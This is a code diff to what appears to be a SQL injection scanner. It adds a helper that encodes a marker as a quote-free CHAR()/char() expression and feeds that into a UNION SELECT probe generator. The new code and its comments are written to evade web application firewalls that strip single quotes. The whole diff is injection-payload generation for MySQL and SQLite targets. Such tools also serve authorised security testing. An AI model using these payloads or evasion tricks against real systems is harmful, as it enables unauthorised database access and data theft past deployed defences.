@@ -155,13 +155,25 @@ def order_by_probes(max_cols: int = 20) -> List[str]:
     return probes
 
 
+def _marker_to_char_expr(marker: str) -> str:
+    """Convert a marker string to a CHAR()/char() expression (quote-free).
+
+    Works for both MySQL CHAR() and SQLite char().  The expression produces
+    the marker string without using any single-quote characters, bypassing
+    naive WAFs that strip quotes.
+    """
+    return "char(" + ",".join(str(ord(c)) for c in marker) + ")"
+
+
 def union_null_probes(col_count: int, marker: str) -> List[str]:
     """
     Generate UNION SELECT probes for a known column count.
 
     For each column position, variants covering string context, numeric context,
-    paren-escape contexts, and WAF-bypass comment styles are generated.
+    paren-escape contexts, WAF-bypass comment styles, and quote-free CHAR()
+    expressions are generated.
     """
+    char_marker = _marker_to_char_expr(marker)
     payloads = []
     for pos in range(col_count):
         # String literal marker (works for MySQL, SQLite)
@@ -173,8 +185,11 @@ def union_null_probes(col_count: int, marker: str) -> List[str]:
         # Integer-padded variant: non-marker columns use sequential integers
         cols_int = [str(i + 1) for i in range(col_count)]
         cols_int[pos] = f"'{marker}'"
+        # Quote-free CHAR() variant: bypasses WAFs that strip single-quotes
+        cols_char = ["NULL"] * col_count
+        cols_char[pos] = char_marker
 
-        for cols in (cols_str, cols_cast, cols_int):
+        for cols in (cols_str, cols_cast, cols_int, cols_char):
             inner = ",".join(cols)
             # String context
             payloads.append(f"' UNION SELECT {inner}-- -")
